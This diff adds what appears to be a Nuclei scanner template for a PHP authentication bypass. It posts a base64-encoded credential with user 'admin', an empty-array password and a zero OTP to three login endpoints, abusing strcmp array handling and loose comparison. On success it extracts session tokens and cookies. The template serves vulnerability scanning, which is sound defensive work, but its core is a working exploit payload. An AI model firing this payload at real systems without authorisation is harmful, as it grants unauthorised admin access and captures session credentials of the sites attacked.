@@ -1,0 +1,77 @@
+id: php-auth-bypass-multi-vuln
+
+info:
+  name: PHP Authentication Bypass - Type Juggling & strcmp Array Vuln
+  author: security-researcher
+  severity: critical
+  description: |
+    Detects PHP authentication bypass vulnerabilities:
+    1. OTP validation bypass using type juggling with != operator
+    2. strcmp() function returns NULL when array is provided as input
+    3. Combined exploitation allows admin account authentication bypass
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
+    - https://www.php.net/manual/en/types.comparisons.php
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        cred={{base64_encode('{"id":"admin","pw":[],"otp":0}')}}
+      
+      - |
+        POST {{BaseURL}}/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        cred={{base64_encode('{"id":"admin","pw":[],"otp":0}')}}
+      
+      - |
+        POST {{BaseURL}}/api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"cred":"{{base64_encode('{\"id\":\"admin\",\"pw\":[],\"otp\":0}')}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "authenticated"
+          - "admin"
+          - "dashboard"
+          - "token"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "login failed"
+          - "invalid"
+          - "error"
+        condition: or
+        negative: true
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        name: session_token
+        part: body
+        regex:
+          - '"token":\s*"([^"]+)"'
+          - '"session":\s*"([^"]+)"'
+          
+      - type: kval
+        part: header
+        kval:
+          - Set-Cookie
+
